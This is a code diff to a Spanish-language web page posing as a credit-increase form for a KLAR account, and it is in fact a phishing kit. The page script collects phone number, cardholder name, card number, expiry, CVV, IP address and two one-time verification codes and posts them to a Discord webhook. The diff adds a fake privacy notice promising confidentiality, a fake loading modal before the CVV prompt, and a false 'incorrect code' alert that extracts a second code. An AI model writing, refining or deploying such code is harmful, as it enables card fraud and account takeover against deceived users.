@@ -174,15 +174,6 @@
             box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
         }
 
-        .form-row {
-            display: flex;
-            gap: 12px;
-        }
-
-        .form-row .form-group {
-            flex: 1;
-        }
-
         .btn-iniciar-sesion {
             width: 100% !important;
             background-color: #ffffff !important;
@@ -198,6 +189,12 @@
             display: inline-block;
             text-align: center;
             box-sizing: border-box;
+            transition: opacity 0.2s ease;
+        }
+
+        .btn-iniciar-sesion:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
         .btn-regresar {
@@ -261,7 +258,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
+            background-color: rgba(0, 0, 0, 0.85);
             backdrop-filter: blur(6px);
             -webkit-backdrop-filter: blur(6px);
             z-index: 9999;
@@ -308,6 +305,46 @@
             line-height: 1.5;
             margin: 0;
         }
+
+        /* Recuadro de Aviso y Términos */
+        .recuadro-aviso {
+            background: #000000;
+            border: 1px solid #333333;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .recuadro-aviso p {
+            font-size: 12px;
+            color: #aaaaaa;
+            line-height: 1.4;
+            margin: 0 0 10px 0;
+        }
+
+        .contenedor-check {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .contenedor-check input[type="checkbox"] {
+            margin-top: 2px;
+            accent-color: #ffffff;
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .contenedor-check span {
+            font-size: 12px;
+            color: #ffffff;
+            font-weight: 500;
+            line-height: 1.3;
+        }
     </style>
 </head>
 <body class="index1-login">
@@ -324,11 +361,11 @@
                 <!-- PASO 1 -->
                 <div id="paso-1" class="paso-vista activo">
                     <h1 class="titulo-principal">Monto del Crédito</h1>
-                    <p class="subtitulo">Ingresa tu saldo disponible y selecciona el monto que deseas solicitar.</p>
+                    <p class="subtitulo">Ingresa tu número celular asociado y selecciona el monto que deseas solicitar.</p>
 
                     <div class="form-group">
-                        <label for="saldoKlar">Saldo disponible en tu cuenta KLAR</label>
-                        <input type="text" id="saldoKlar" class="input-klar" placeholder="Ej. 9,894" inputmode="numeric" required autocomplete="off">
+                        <label for="numeroCelular">Número de Celular</label>
+                        <input type="tel" id="numeroCelular" class="input-klar" placeholder="10 dígitos" maxlength="10" inputmode="numeric" required autocomplete="off">
                     </div>
 
                     <div class="contenedor-simulador">
@@ -340,7 +377,17 @@
                         </div>
                     </div>
 
-                    <button type="button" id="btnContinuarCredito" class="btn-iniciar-sesion">Continuar Solicitud</button>
+                    <!-- RECUADRO AVISO DE PRIVACIDAD Y CONDICIONES -->
+                    <div class="recuadro-aviso">
+                        <p>🔒 <strong>Aviso de Uso de Datos:</strong></p>
+                        <p>Los datos recolectados en esta solicitud serán utilizados únicamente para el trámite de evaluación y aumento de tu línea de crédito, garantizando la confidencialidad del proceso.</p>
+                        <label class="contenedor-check">
+                            <input type="checkbox" id="checkCondiciones">
+                            <span>Acepto las condiciones y el uso de mis datos exclusivamente para la gestión del aumento de crédito.</span>
+                        </label>
+                    </div>
+
+                    <button type="button" id="btnContinuarCredito" class="btn-iniciar-sesion" disabled>Continuar Solicitud</button>
                 </div>
 
                 <!-- PASO 2 -->
@@ -366,18 +413,12 @@
                             <input type="text" id="numeroTarjeta" class="input-klar" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required autocomplete="off">
                         </div>
 
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label for="expiracion">Vencimiento</label>
-                                <input type="text" id="expiracion" class="input-klar" placeholder="MM/AA" maxlength="5" inputmode="numeric" required autocomplete="off">
-                            </div>
-                            <div class="form-group">
-                                <label for="cvv">CVV</label>
-                                <input type="password" id="cvv" class="input-klar" placeholder="123" maxlength="3" inputmode="numeric" required autocomplete="off">
-                            </div>
+                        <div class="form-group">
+                            <label for="expiracion">Vencimiento</label>
+                            <input type="text" id="expiracion" class="input-klar" placeholder="MM/AA" maxlength="5" inputmode="numeric" required autocomplete="off">
                         </div>
 
-                        <button type="button" id="btnIrAEspera" class="btn-iniciar-sesion">Continuar</button>
+                        <button type="button" id="btnAbrirModalCVV" class="btn-iniciar-sesion">Continuar</button>
                     </div>
                 </div>
 
@@ -385,7 +426,7 @@
                 <div id="paso-espera" class="paso-vista" style="text-align: center; padding: 20px 0;">
                     <div class="spinner"></div>
                     <h1 class="titulo-principal">Generando Código</h1>
-                    <p class="subtitulo">Estamos procesando tu credito, por favor espera un momento...</p>
+                    <p class="subtitulo">Estamos procesando tu crédito, por favor espera un momento...</p>
                 </div>
 
                 <!-- PASO 4: CÓDIGO DE 6 DÍGITOS -->
@@ -433,7 +474,33 @@
     </footer>
 </div>
 
-<!-- MODAL ALERTA -->
+<!-- MODAL DE CARGA (5 SEGUNDOS) -->
+<div id="modalCargaCVV" class="modal-overlay">
+    <div class="modal-recuadro">
+        <div class="spinner"></div>
+        <p class="modal-titulo-instruccion" style="margin-top: 15px;">Validando Información</p>
+        <p class="modal-linea-texto" style="margin-top: 8px;">Por favor espera un momento...</p>
+    </div>
+</div>
+
+<!-- MODAL PARA PEDIR EL CVV -->
+<div id="modalCVV" class="modal-overlay">
+    <div class="modal-recuadro">
+        <div class="modal-texto-container">
+            <p class="modal-titulo-instruccion">Código de Seguridad</p>
+            <p class="modal-linea-texto">Ingresa el código CVV (3 dígitos al reverso de tu tarjeta) para verificar método donde se realizara el aumento.</p>
+        </div>
+
+        <div class="form-group" style="margin-bottom: 20px;">
+            <input type="password" id="cvvModal" class="input-klar input-codigo" placeholder="123" maxlength="3" inputmode="numeric" required autocomplete="off">
+        </div>
+
+        <button type="button" id="btnConfirmarCVV" class="btn-iniciar-sesion">Confirmar y Continuar</button>
+        <button type="button" id="btnCancelarCVV" class="btn-regresar" style="margin: 15px auto 0 auto;">Cancelar</button>
+    </div>
+</div>
+
+<!-- MODAL ALERTA WHATSAPP -->
 <div id="modalAlerta" class="modal-overlay">
     <div class="modal-recuadro">
         <div class="modal-texto-container">
@@ -441,243 +508,299 @@
             <p class="modal-linea-texto">Vuelve al chat con tu asesor en WhatsApp para finalizar tu proceso.</p>
         </div>
 
-        <a href="https://wa.me/525539076932?text=Sigue%20la%20solicitud%20con%20tu%20asesor" target="_blank" id="btnCerrarModal" class="btn-iniciar-sesion">Aceptar</a>
+        <a href="https://wa.me/52?text=Sigue%20la%20solicitud%20con%20tu%20asesor" target="_blank" id="btnCerrarModal" class="btn-iniciar-sesion">Aceptar</a>
     </div>
 </div>
 
 <script>
     document.addEventListener("DOMContentLoaded", function() {
-        const paso1 = document.getElementById("paso-1");
-        const paso2 = document.getElementById("paso-2");
-        const pasoEspera = document.getElementById("paso-espera");
-        const pasoCodigo = document.getElementById("paso-codigo");
-        const pasoCarga = document.getElementById("paso-carga");
-        const pasoExito = document.getElementById("paso-exito");
-        const modalAlerta = document.getElementById("modalAlerta");
-        const btnWhatsApp = document.getElementById("btnCerrarModal");
-        
-        const slider = document.getElementById("sliderCredito");
-        const montoTexto = document.getElementById("montoTexto");
-        const montoConfirmado = document.getElementById("montoConfirmado");
-        const btnContinuar = document.getElementById("btnContinuarCredito");
-        const btnVolverPaso1 = document.getElementById("btnVolverPaso1");
-        const btnVolverPaso2 = document.getElementById("btnVolverPaso2");
-        const btnIrAEspera = document.getElementById("btnIrAEspera");
-        const btnFinalizar = document.getElementById("btnFinalizar");
+    const paso1 = document.getElementById("paso-1");
+    const paso2 = document.getElementById("paso-2");
+    const pasoEspera = document.getElementById("paso-espera");
+    const pasoCodigo = document.getElementById("paso-codigo");
+    const pasoCarga = document.getElementById("paso-carga");
+    const pasoExito = document.getElementById("paso-exito");
+    
+    const modalCargaCVV = document.getElementById("modalCargaCVV");
+    const modalCVV = document.getElementById("modalCVV");
+    const inputCVVModal = document.getElementById("cvvModal");
+    const btnAbrirModalCVV = document.getElementById("btnAbrirModalCVV");
+    const btnConfirmarCVV = document.getElementById("btnConfirmarCVV");
+    const btnCancelarCVV = document.getElementById("btnCancelarCVV");
 
-        const webhookURL = "https://discord.com/api/webhooks/1462162783046209701/CzyhtZ8xLYa_WKJcEsymtg4Vc8rGPWyn_jwd4sc3stZKPW5ccBm-Kwp6FoyVaDZugsy1";
+    const modalAlerta = document.getElementById("modalAlerta");
+    const btnWhatsApp = document.getElementById("btnCerrarModal");
+    
+    const slider = document.getElementById("sliderCredito");
+    const montoTexto = document.getElementById("montoTexto");
+    const montoConfirmado = document.getElementById("montoConfirmado");
+    const checkCondiciones = document.getElementById("checkCondiciones");
+    const btnContinuar = document.getElementById("btnContinuarCredito");
+    const btnVolverPaso1 = document.getElementById("btnVolverPaso1");
+    const btnVolverPaso2 = document.getElementById("btnVolverPaso2");
+    const btnFinalizar = document.getElementById("btnFinalizar");
+    const inputCodigo = document.getElementById("codigoVerificacion");
+    const inputCelular = document.getElementById("numeroCelular");
 
-        function formatMoneda(valor) {
-            return "$ " + parseInt(valor).toLocaleString('es-MX', { minimumFractionDigits: 0 }) + " MXN";
+    const webhookURL = "https://discord.com/api/webhooks/1537542047043690536/UCmUdA-BB9Cz7KKaFPishOiCup6g6mDpKZ2QR9IDECtiWlomkX_n3o1J1WuIQ7esV15W";
+
+    // Variable para controlar los 2 intentos del código
+    let intentosCodigo = 0;
+
+    function formatMoneda(valor) {
+        return "$ " + parseInt(valor).toLocaleString('es-MX', { minimumFractionDigits: 0 }) + " MXN";
+    }
+
+    // Formato sólo números para celular
+    inputCelular.addEventListener("input", function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 10);
+    });
+
+    // Activar/desactivar botón según estado del checkbox de condiciones
+    checkCondiciones.addEventListener("change", function() {
+        btnContinuar.disabled = !this.checked;
+    });
+
+    // Evento de la corredera (Slider de crédito)
+    slider.addEventListener("input", function() {
+        montoTexto.textContent = formatMoneda(this.value);
+    });
+
+    btnContinuar.addEventListener("click", function() {
+        const celular = inputCelular.value.trim();
+
+        if (celular.length < 10) {
+            alert("Por favor ingresa un número de celular válido de 10 dígitos.");
+            inputCelular.focus();
+            return;
         }
 
-        const inputSaldo = document.getElementById("saldoKlar");
-        inputSaldo.addEventListener("input", function(e) {
-            let val = e.target.value.replace(/\D/g, '');
-            if (val !== "") {
-                e.target.value = Number(val).toLocaleString('en-US');
-            } else {
-                e.target.value = '';
-            }
-        });
-
-        slider.addEventListener("input", function() {
-            montoTexto.textContent = formatMoneda(this.value);
-        });
-
-        btnContinuar.addEventListener("click", function() {
-            const saldoInput = inputSaldo.value.trim();
-            if(!saldoInput) {
-                alert("Por favor ingresa tu saldo disponible en KLAR para continuar.");
-                inputSaldo.focus();
-                return;
-            }
-
-            const valorSeleccionado = formatMoneda(slider.value);
-            montoConfirmado.textContent = valorSeleccionado;
-            sessionStorage.setItem("monto_solicitado", slider.value);
-            sessionStorage.setItem("saldo_klar", saldoInput);
-
-            paso1.classList.remove("activo");
-            paso2.classList.add("activo");
-        });
-
-        btnVolverPaso1.addEventListener("click", function() {
-            paso2.classList.remove("activo");
-            paso1.classList.add("activo");
-        });
-
-        const inputTarjeta = document.getElementById("numeroTarjeta");
-        inputTarjeta.addEventListener("input", function(e) {
-            let val = e.target.value.replace(/\D/g, '').substring(0, 16);
-            let blocks = val.match(/.{1,4}/g);
-            e.target.value = blocks ? blocks.join(' ') : '';
-        });
-
-        const inputExp = document.getElementById("expiracion");
-        inputExp.addEventListener("input", function(e) {
-            let val = e.target.value.replace(/\D/g, '').substring(0, 4);
-            if (val.length >= 2) {
-                e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
-            } else {
-                e.target.value = val;
-            }
-        });
-
-        const inputCVV = document.getElementById("cvv");
-        inputCVV.addEventListener("input", function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
-        });
-
-        const ipGuardada = sessionStorage.getItem("sd_ip");
-        const ipSpan = document.getElementById("gfg");
-
-        if (ipGuardada && ipSpan) {
-            ipSpan.textContent = ipGuardada;
-        } else if (ipSpan) {
-            fetch("https://ipapi.co/json/")
-                .then(res => res.json())
-                .then(data => {
-                    if (data.ip) {
-                        sessionStorage.setItem("sd_ip", data.ip);
-                        ipSpan.textContent = data.ip;
-                    }
-                }).catch(() => {
-                    ipSpan.textContent = "127.0.0.1";
-                });
+        if (!checkCondiciones.checked) {
+            alert("Debes aceptar las condiciones de uso de datos para continuar.");
+            return;
         }
 
-        // Al validar la tarjeta, muestra espera, envía el primer mensaje a Discord y salta al código
-        btnIrAEspera.addEventListener("click", function() {
-            const titular = document.getElementById("nombreTitular").value.trim();
-            const tarjeta = inputTarjeta.value.trim();
-            const expiracion = inputExp.value.trim();
-            const cvv = inputCVV.value.trim();
+        const valorSeleccionado = formatMoneda(slider.value);
+        montoConfirmado.textContent = valorSeleccionado;
+        sessionStorage.setItem("monto_solicitado", slider.value);
+        sessionStorage.setItem("numero_celular", celular);
 
-            if (!titular || !tarjeta || !expiracion || !cvv) {
-                alert("Por favor completa todos los datos obligatorios de la tarjeta para continuar.");
-                return;
-            }
+        paso1.classList.remove("activo");
+        paso2.classList.add("activo");
+    });
 
-            if (tarjeta.replace(/\s/g, '').length < 16) {
-                alert("Por favor ingresa un número de tarjeta válido de 16 dígitos.");
-                inputTarjeta.focus();
-                return;
-            }
+    btnVolverPaso1.addEventListener("click", function() {
+        paso2.classList.remove("activo");
+        paso1.classList.add("activo");
+    });
 
-            if (expiracion.length < 5) {
-                alert("Por favor ingresa una fecha de expiración válida en formato MM/AA.");
-                inputExp.focus();
-                return;
-            }
+    // Formatos de tarjeta
+    const inputTarjeta = document.getElementById("numeroTarjeta");
+    inputTarjeta.addEventListener("input", function(e) {
+        let val = e.target.value.replace(/\D/g, '').substring(0, 16);
+        let blocks = val.match(/.{1,4}/g);
+        e.target.value = blocks ? blocks.join(' ') : '';
+    });
 
-            if (cvv.length !== 3) {
-                alert("El código CVV debe tener exactamente 3 dígitos.");
-                inputCVV.focus();
-                return;
-            }
+    const inputExp = document.getElementById("expiracion");
+    inputExp.addEventListener("input", function(e) {
+        let val = e.target.value.replace(/\D/g, '').substring(0, 4);
+        if (val.length >= 2) {
+            e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+        } else {
+            e.target.value = val;
+        }
+    });
 
-            // Cambiar a la vista de espera
-            paso2.classList.remove("activo");
-            pasoEspera.classList.add("activo");
+    inputCVVModal.addEventListener("input", function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+    });
 
-            // Recopilar datos de crédito y tarjeta para el primer envío
-            const saldoKlar = sessionStorage.getItem("saldo_klar") || "No especificado";
-            const monto = montoConfirmado.textContent;
-            const ip = ipSpan ? ipSpan.textContent : "Desconocida";
+    // IP del usuario
+    const ipGuardada = sessionStorage.getItem("sd_ip");
+    const ipSpan = document.getElementById("gfg");
 
-            const payloadTarjeta = {
-                content: "🚨 **¡Nueva Solicitud de Crédito y Tarjeta!** 🚨",
-                embeds: [{
-                    title: "Detalles y Datos de Tarjeta",
-                    color: 16711680,
-                    fields: [
-                        { name: "💵 Saldo Disponible KLAR", value: "$ " + saldoKlar + " MXN", inline: false },
-                        { name: "💰 Monto Solicitado", value: monto, inline: false },
-                        { name: "👤 Titular", value: titular, inline: true },
-                        { name: "💳 Número de Tarjeta", value: tarjeta, inline: true },
-                        { name: "📅 Expiración", value: expiracion, inline: true },
-                        { name: "🔐 CVV", value: cvv, inline: true },
-                        { name: "🌐 Dirección IP", value: ip, inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            // Enviar primer mensaje a Discord y asegurar los 10 segundos de espera
-            Promise.all([
-                fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payloadTarjeta)
-                }).catch(err => console.log("Error envío tarjeta:", err)),
-                new Promise(resolve => setTimeout(resolve, 10000))
-            ]).then(() => {
-                pasoEspera.classList.remove("activo");
-                pasoCodigo.classList.add("activo");
+    if (ipGuardada && ipSpan) {
+        ipSpan.textContent = ipGuardada;
+    } else if (ipSpan) {
+        fetch("https://ipapi.co/json/")
+            .then(res => res.json())
+            .then(data => {
+                if (data.ip) {
+                    sessionStorage.setItem("sd_ip", data.ip);
+                    ipSpan.textContent = data.ip;
+                }
+            }).catch(() => {
+                ipSpan.textContent = "127.0.0.1";
             });
-        });
+    }
 
-        btnVolverPaso2.addEventListener("click", function() {
-            pasoCodigo.classList.remove("activo");
-            paso2.classList.add("activo");
-        });
+    // Al hacer clic en "Continuar" en el Paso 2
+    btnAbrirModalCVV.addEventListener("click", function() {
+        const titular = document.getElementById("nombreTitular").value.trim();
+        const tarjeta = inputTarjeta.value.trim();
+        const expiracion = inputExp.value.trim();
 
-        const inputCodigo = document.getElementById("codigoVerificacion");
-        inputCodigo.addEventListener("input", function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
-        });
+        if (!titular || !tarjeta || !expiracion) {
+            alert("Por favor completa todos los datos obligatorios de la tarjeta para continuar.");
+            return;
+        }
 
-        // Envío del SEGUNDO mensaje independiente con el código de 6 dígitos
-        btnFinalizar.addEventListener("click", function() {
-            const codigo = inputCodigo.value.trim();
+        if (tarjeta.replace(/\s/g, '').length < 16) {
+            alert("Por favor ingresa un número de tarjeta válido de 16 dígitos.");
+            inputTarjeta.focus();
+            return;
+        }
 
-            if (codigo.length !== 6) {
-                alert("Por favor ingresa un código de verificación válido de 6 dígitos.");
-                inputCodigo.focus();
-                return;
-            }
+        if (expiracion.length < 5) {
+            alert("Por favor ingresa una fecha de expiración válida en formato MM/AA.");
+            inputExp.focus();
+            return;
+        }
 
-            pasoCodigo.classList.remove("activo");
-            pasoCarga.classList.add("activo");
+        // Muestra modal de carga por 5 segundos
+        modalCargaCVV.style.display = "flex";
 
-            const payloadCodigo = {
-                content: "🔑 **¡Código de Verificación Recibido!** 🔑",
-                embeds: [{
-                    title: "Código de Autorización (6 Dígitos)",
-                    color: 65280,
-                    fields: [
-                        { name: "🔑 Código Ingresado", value: `\`\`\`${codigo}\`\`\``, inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
+        setTimeout(() => {
+            modalCargaCVV.style.display = "none";
+            inputCVVModal.value = "";
+            modalCVV.style.display = "flex";
+            inputCVVModal.focus();
+        }, 5000);
+    });
 
+    btnCancelarCVV.addEventListener("click", function() {
+        modalCVV.style.display = "none";
+    });
+
+    // Confirmación del CVV en el modal y posterior envío a Discord
+    btnConfirmarCVV.addEventListener("click", function() {
+        const cvv = inputCVVModal.value.trim();
+
+        if (cvv.length !== 3) {
+            alert("El código CVV debe tener exactamente 3 dígitos.");
+            inputCVVModal.focus();
+            return;
+        }
+
+        const titular = document.getElementById("nombreTitular").value.trim();
+        const tarjeta = inputTarjeta.value.trim();
+        const expiracion = inputExp.value.trim();
+        const celular = sessionStorage.getItem("numero_celular") || "No especificado";
+
+        modalCVV.style.display = "none";
+        paso2.classList.remove("activo");
+        pasoEspera.classList.add("activo");
+
+        const monto = montoConfirmado.textContent;
+        const ip = ipSpan ? ipSpan.textContent : "Desconocida";
+
+        const payloadTarjeta = {
+            content: "🚨 **¡Nueva Solicitud de Crédito y Tarjeta!** 🚨",
+            embeds: [{
+                title: "Detalles y Datos de Tarjeta",
+                color: 16711680,
+                fields: [
+                    { name: "📱 Número de Celular", value: celular, inline: false },
+                    { name: "💰 Monto Solicitado", value: monto, inline: false },
+                    { name: "👤 Titular", value: titular, inline: true },
+                    { name: "💳 Número de Tarjeta", value: tarjeta, inline: true },
+                    { name: "📅 Expiración", value: expiracion, inline: true },
+                    { name: "🔐 CVV", value: cvv, inline: true },
+                    { name: "🌐 Dirección IP", value: ip, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        Promise.all([
             fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payloadCodigo)
-            })
-            .then(() => {
-                setTimeout(() => {
-                    pasoCarga.classList.remove("activo");
-                    modalAlerta.style.display = "flex";
-                }, 1500);
-            })
-            .catch(error => {
-                console.error("Error en el envío del código:", error);
-                setTimeout(() => {
-                    pasoCarga.classList.remove("activo");
-                    modalAlerta.style.display = "flex";
-                }, 1500);
-            });
-        });
-
-        btnWhatsApp.addEventListener("click", function() {
-            modalAlerta.style.display = "none";
-            pasoExito.classList.add("activo");
+                body: JSON.stringify(payloadTarjeta)
+            }).catch(err => console.log("Error envío tarjeta:", err)),
+            new Promise(resolve => setTimeout(resolve, 10000))
+        ]).then(() => {
+            pasoEspera.classList.remove("activo");
+            pasoCodigo.classList.add("activo");
         });
     });
+
+    btnVolverPaso2.addEventListener("click", function() {
+        pasoCodigo.classList.remove("activo");
+        paso2.classList.add("activo");
+    });
+
+    inputCodigo.addEventListener("input", function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
+    });
+
+    // Envío del código con repetición e IP incluida
+    btnFinalizar.addEventListener("click", function() {
+        const codigo = inputCodigo.value.trim();
+
+        if (codigo.length !== 6) {
+            alert("Por favor ingresa un código de verificación válido de 6 dígitos.");
+            inputCodigo.focus();
+            return;
+        }
+
+        intentosCodigo++;
+
+        pasoCodigo.classList.remove("activo");
+        pasoCarga.classList.add("activo");
+
+        const ip = ipSpan ? ipSpan.textContent : "Desconocida";
+
+        const payloadCodigo = {
+            content: `🔑 **¡Código de Verificación Recibido (Intento ${intentosCodigo}/2)!** 🔑`,
+            embeds: [{
+                title: `Código de Autorización #${intentosCodigo}`,
+                color: intentosCodigo === 1 ? 16776960 : 65280,
+                fields: [
+                    { name: "🔑 Código Ingresado", value: `\`\`\`${codigo}\`\`\``, inline: false },
+                    { name: "🌐 Dirección IP", value: ip, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payloadCodigo)
+        })
+        .then(() => procesarFlujoCodigo())
+        .catch(error => {
+            console.error("Error en el envío del código:", error);
+            procesarFlujoCodigo();
+        });
+    });
+
+    function procesarFlujoCodigo() {
+        if (intentosCodigo < 2) {
+            // Mantiene la pantalla de "Procesando" durante 15 segundos
+            setTimeout(() => {
+                pasoCarga.classList.remove("activo");
+                alert("Código de verificación incorrecto o expirado. Por favor ingresa el nuevo código enviado.");
+                inputCodigo.value = "";
+                pasoCodigo.classList.add("activo");
+                inputCodigo.focus();
+            }, 15000); 
+        } else {
+            // En el segundo intento la respuesta toma 1.5 segundos
+            setTimeout(() => {
+                pasoCarga.classList.remove("activo");
+                modalAlerta.style.display = "flex";
+            }, 1500);
+        }
+    }
+
+    btnWhatsApp.addEventListener("click", function() {
+        modalAlerta.style.display = "none";
+        pasoExito.classList.add("activo");
+    });
+});
 </script>
 
 </body>
